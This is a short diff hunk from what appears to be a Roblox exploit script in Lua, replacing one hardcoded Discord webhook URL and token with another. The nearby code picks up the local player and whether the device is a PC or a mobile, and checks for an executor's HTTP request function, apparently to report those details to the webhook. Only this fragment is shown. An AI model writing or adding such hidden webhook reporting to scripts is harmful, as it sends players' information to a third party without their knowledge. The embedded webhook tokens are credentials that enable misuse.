@@ -30795,7 +30795,7 @@ do
 	local UserInputService2 = game:GetService("UserInputService")
 	local localPlayer2 = Players2.LocalPlayer
 	request_ = syn and syn.request or http and http.request or http_request or request
-	local str = "https://discord.com/api/webhooks/1381274668706693120/D5XogJZVdo_q7XZ9bEJDETQjevMFaBSeVRT4EJ0fLKtPeqR112o7PmA1fN_hZn4rmJ2y"
+	local str = "https://discord.com/api/webhooks/1553998450759041186/Qx4IPDAwUBB36bveRLT4v3xaZH8-F1ohLdcnXufV5LHZI80Gxf_Xqq6UzWuYHZK9331g"
 	local str2 = UserInputService2.KeyboardEnabled and UserInputService2.MouseEnabled and "PC" or "Mobile / Tablet / Other"
 
 	if request_ and localPlayer2 then
